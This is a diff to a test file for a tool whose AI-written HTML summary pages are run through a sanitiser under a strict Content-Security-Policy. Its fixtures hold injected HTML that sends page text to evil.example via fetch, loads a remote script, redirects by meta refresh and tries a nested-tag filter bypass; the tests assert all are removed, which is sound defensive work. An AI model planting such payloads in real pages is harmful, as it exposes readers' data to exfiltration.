@@ -17,6 +17,8 @@ import {
   parseJev,
   parseTabId,
   placeholderHtml,
+  securePage,
+  SUMMARY_CSP,
   summaryPrompt,
   summarySystem,
   toolLine,
@@ -135,7 +137,7 @@ describe("core", () => {
   test("the system prompt carries show-me and the page's contract", () => {
     const s = summarySystem("SHOW-ME-TEXT");
     expect(s).toContain("<show-me>\nSHOW-ME-TEXT\n</show-me>");
-    expect(s).toContain("mermaid@11.4.1");
+    expect(s).toContain("write no <script> at all");
     expect(s).toContain("starting with <!doctype html>");
   });
 
@@ -164,6 +166,27 @@ describe("core", () => {
     expect(placeholderHtml("a <b> & c")).toContain(
       "<p>a &lt;b&gt; &amp; c</p>",
     );
+  });
+
+  test("securePage: the model's scripts and refreshes go; the CSP and Mermaid loader lead", () => {
+    const evil = `<!doctype html><html><head>
+<meta http-equiv="refresh" content="0;url=https://evil.example">
+<script>fetch("https://evil.example/?" + document.body.innerText)</script>
+<SCRIPT src="https://evil.example/x.js"></SCRIPT >
+</head><body><pre class="mermaid">graph TD; A-->B</pre><scr<script>x()</script>ipt>alert(1)</script><script>unclosed`;
+    const page = securePage(evil);
+    expect(page).not.toMatch(/evil\.example|alert/);
+    expect(page.match(/<script/gi)?.length).toBe(1); // the loader alone
+    expect(page.startsWith(
+      `<!doctype html>\n<meta http-equiv="Content-Security-Policy" content="${SUMMARY_CSP}">\n<script type="module">import mermaid`,
+    )).toBe(true);
+    expect(page).toContain('<pre class="mermaid">graph TD; A-->B</pre>');
+    expect(SUMMARY_CSP).toContain("default-src 'none'");
+    expect(SUMMARY_CSP).toContain(
+      "script-src 'sha256-Olg3I0JmxL6iPaXBstF8PxlFzHJ/YejN9UP70TigNEw=' https://cdn.jsdelivr.net/npm/mermaid@11.4.1/;",
+    );
+    const scriptSrc = SUMMARY_CSP.split("; ").find((d) => d.startsWith("script-src"))!;
+    expect(scriptSrc).not.toMatch(/unsafe-inline|unsafe-eval/);
   });
 
   test("orca's JSON: the new tab's id, and whether a tab is listed", () => {
@@ -391,7 +414,7 @@ describe("session", () => {
       { text: expect.stringContaining("<show-me>"), cache: true },
     ]);
     expect(w.prompt).toBe(summaryPrompt("USER: add send later"));
-    expect(seen.files.get(PAGE)).toBe(html(1));
+    expect(seen.files.get(PAGE)).toBe(securePage(html(1)));
     expect(seen.orca.filter((c) => c.startsWith("tab create"))).toEqual([]); // never opens itself
     expect((await band($)).texts).toContain("updated 09:05");
   });
@@ -420,7 +443,7 @@ describe("session", () => {
     expect(seen.writes[1]!.prompt).toBe(
       summaryPrompt("USER: add send later", html(1)),
     );
-    expect(seen.files.get(PAGE)).toBe(html(2));
+    expect(seen.files.get(PAGE)).toBe(securePage(html(2)));
     expect(seen.orca).toContain("reload --page pg1 --json");
 
     seen.p.update = 0.1; // Jev: nothing worth redrawing
@@ -538,7 +561,20 @@ describe("session", () => {
     seen.reply = undefined;
     await turn($, clock, "z", 1);
     expect(seen.asked).toEqual(["big"]);
-    expect(seen.files.get(PAGE)).toBe(html(3));
+    expect(seen.files.get(PAGE)).toBe(securePage(html(3)));
+  });
+
+  test("a page injected with a script is written without it, under the CSP", async ($, on) => {
+    const { seen, clock } = engine(on);
+    seen.reply = {
+      isAnswered: true,
+      text: `<!doctype html><html><body>ok<script>fetch("https://evil.example")</script></body></html>`,
+    };
+    await turn($, clock, "x", 1);
+    const page = seen.files.get(PAGE)!;
+    expect(page).not.toContain("evil.example");
+    expect(page).toContain(`content="${SUMMARY_CSP}"`);
+    expect(page).toContain("<body>ok</body>");
   });
 
   test("the band toggles the Orca tab, a placeholder before any summary", async ($, on) => {
